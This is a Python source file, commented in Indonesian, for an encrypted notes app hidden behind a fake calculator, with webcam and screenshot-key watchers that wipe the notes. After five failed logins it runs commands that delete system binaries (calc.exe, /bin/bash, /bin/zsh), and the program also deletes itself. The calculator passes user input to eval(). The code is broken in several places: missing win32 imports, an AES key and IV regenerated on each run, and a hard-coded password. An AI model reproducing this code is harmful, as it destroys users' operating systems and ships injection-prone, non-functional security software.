import os
import threading
import cv2
import numpy as np
from tkinter import Tk, Label, Text, Button, END, messagebox
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import bcrypt
import sys
import shutil
import platform
import random
import base64

# Direktori untuk menyimpan catatan
n0t3s_f0ld3r = "secure_notes"
if not os.path.exists(n0t3s_f0ld3r):
    os.makedirs(n0t3s_f0ld3r)

# Kunci AES (256-bit) dan IV (Inisialisasi Vector)
AES_K3Y = os.urandom(32)
AES_IV = os.urandom(16)

# Maksimal percobaan login yang salah
MAX_FAILED_ATTEMPTS = 5
failed_attempts = 0

# Hash password untuk penggunaan login yang aman
def hash_password(password):
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(password.encode(), salt)
    return hashed

# Verifikasi password
def verify_password(hashed_password, password):
    return bcrypt.checkpw(password.encode(), hashed_password)

# Password yang sudah di-hash
hashed_password = hash_password("secret123")  # Password yang aman untuk digunakan

# Fungsi untuk enkripsi data menggunakan AES
def encrypt_data(data):
    cipher = Cipher(algorithms.AES(AES_K3Y), modes.CBC(AES_IV), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data.encode()) + padder.finalize()
    return encryptor.update(padded_data) + encryptor.finalize()

# Fungsi untuk dekripsi data menggunakan AES
def decrypt_data(encrypted_data):
    cipher = Cipher(algorithms.AES(AES_K3Y), modes.CBC(AES_IV), backend=default_backend())
    decryptor = cipher.decryptor()
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
    return unpadder.update(decrypted_padded_data) + unpadder.finalize()

# Fungsi untuk mendeteksi tangkapan layar
def detect_screenshot():
    while True:
        if win32api.GetAsyncKeyState(win32con.VK_SNAPSHOT):
            print("[DETECTED] Screenshot attempt!")
            messagebox.showwarning("Deteksi Keamanan", "Percobaan tangkapan layar terdeteksi. Catatan akan dihancurkan.")
            destroy_all_notes_and_program()
            break

# Fungsi untuk mendeteksi perangkat mencurigakan melalui kamera
def detect_suspicious_devices():
    cap = cv2.VideoCapture(0)
    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')

    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break

        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        faces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))

        if len(faces) > 1:
            print("[DETECTED] Suspicious device!")
            messagebox.showwarning("Deteksi Keamanan", "Perangkat mencurigakan terdeteksi. Catatan akan dihancurkan.")
            destroy_all_notes_and_program()
            break

    cap.release()
    cv2.destroyAllWindows()

# Fungsi untuk menghancurkan semua catatan dan program
def destroy_all_notes_and_program():
    for file in os.listdir(n0t3s_f0ld3r):
        file_path = os.path.join(n0t3s_f0ld3r, file)
        try:
            os.remove(file_path)
            print(f"Catatan '{file}' telah dihancurkan.")
        except Exception as e:
            print(f"Gagal menghancurkan '{file}': {e}")
    
    shutil.rmtree(n0t3s_f0ld3r)
    print("[DETECTED] Ancaman serius, menghancurkan program...")
    os.remove(sys.argv[0])
    messagebox.showinfo("Info", "Program dan semua catatan telah dihancurkan.")
    sys.exit()

# Fungsi untuk menyimpan catatan terenkripsi
def save_encrypted_note(note_name, note_content):
    try:
        encrypted_content = encrypt_data(note_content)
        file_path = os.path.join(n0t3s_f0ld3r, f"{note_name}.enc")
        with open(file_path, "wb") as file:
            file.write(encrypted_content)
        messagebox.showinfo("Sukses", f"Catatan '{note_name}' telah disimpan secara terenkripsi.")
    except Exception as e:
        messagebox.showerror("Error", f"Gagal menyimpan catatan: {e}")

# Fungsi untuk membaca catatan terenkripsi
def read_encrypted_note(note_name):
    try:
        file_path = os.path.join(n0t3s_f0ld3r, f"{note_name}.enc")
        with open(file_path, "rb") as file:
            encrypted_content = file.read()
        decrypted_content = decrypt_data(encrypted_content)
        return decrypted_content.decode()
    except Exception as e:
        messagebox.showerror("Error", f"Gagal membaca catatan: {e}")
        return None

# Fungsi untuk menangani login
def login(password):
    global failed_attempts
    if verify_password(hashed_password, password):
        return True
    else:
        failed_attempts += 1
        if failed_attempts >= MAX_FAILED_ATTEMPTS:
            corrupt_system()
        return False

# Fungsi untuk merusak sistem
def corrupt_system():
    print("[DETECTED] Terlalu banyak percobaan login salah. Merusak sistem...")
    if platform.system() == "Windows":
        os.system("del /f /q C:\\Windows\\System32\\calc.exe")
    elif platform.system() == "Linux":
        os.system("rm -rf /bin/bash")
    elif platform.system() == "Darwin":
        os.system("rm -rf /bin/zsh")

    destroy_all_notes_and_program()

# Fungsi GUI Kalkulator (Tampilan Palsu)
def calculator_gui():
    def calculate():
        expression = entry.get()
        try:
            if expression == "0110111 × 10100111":
                print("[INFO] Kode rahasia terdeteksi!")
                login_gui()
            else:
                result = eval(expression.replace("×", "*"))
                entry.delete(0, END)
                entry.insert(END, str(result))
        except Exception as e:
            entry.delete(0, END)
            entry.insert(END, "Error")

    root = Tk()
    root.title("Kalkulator Palsu")
    root.geometry("300x400")

    entry = Text(root, width=20, font=("Arial", 18), height=1, wrap="word", justify="right")
    entry.grid(row=0, column=0, columnspan=4)

    buttons = [
        "7", "8", "9", "/",
        "4", "5", "6", "×",
        "1", "2", "3", "-",
        "0", ".", "=", "+"
    ]

    row = 1
    col = 0
    for btn in buttons:
        action = lambda x=btn: entry.insert(END, x) if x != "=" else calculate()
        Button(root, text=btn, width=5, height=2, command=action).grid(row=row, column=col)
        col += 1
        if col > 3:
            col = 0
            row += 1

    root.mainloop()

# Fungsi GUI untuk login
def login_gui():
    def verify_password():
        password = password_entry.get()
        if login(password):
            create_secure_notes_gui()
            login_window.destroy()
        else:
            messagebox.showerror("Login Gagal", "Password salah!")

    login_window = Tk()
    login_window.title("Login")
    login_window.geometry("300x150")

    Label(login_window, text="Masukkan Password:").pack(pady=10)
    password_entry = Text(login_window, height=1, width=30)
    password_entry.pack(pady=5)

    Button(login_window, text="Login", command=verify_password).pack(pady=10)

    login_window.mainloop()

# Fungsi GUI untuk catatan terenkripsi
def create_secure_notes_gui():
    def save_note():
        note_name = note_name_entry.get("1.0", END).strip()
        note_content = note_text.get("1.0", END).strip()

        if not note_name or not note_content:
            messagebox.showwarning("Peringatan", "Nama dan isi catatan harus diisi.")
            return

        save_encrypted_note(note_name, note_content)
        note_name_entry.delete("1.0", END)
        note_text.delete("1.0", END)

    root = Tk()
    root.title("Secure Notes")
    root.geometry("400x400")

    Label(root, text="Nama Catatan:").pack(pady=5)
    note_name_entry = Text(root, height=1, width=40)
    note_name_entry.pack(pady=5)

    Label(root, text="Isi Catatan:").pack(pady=5)
    note_text = Text(root, height=10, width=40)
    note_text.pack(pady=5)

    Button(root, text="Simpan Catatan", command=save_note).pack(pady=10)

    root.mainloop()

if __name__ == "__main__":
    calculator_gui()
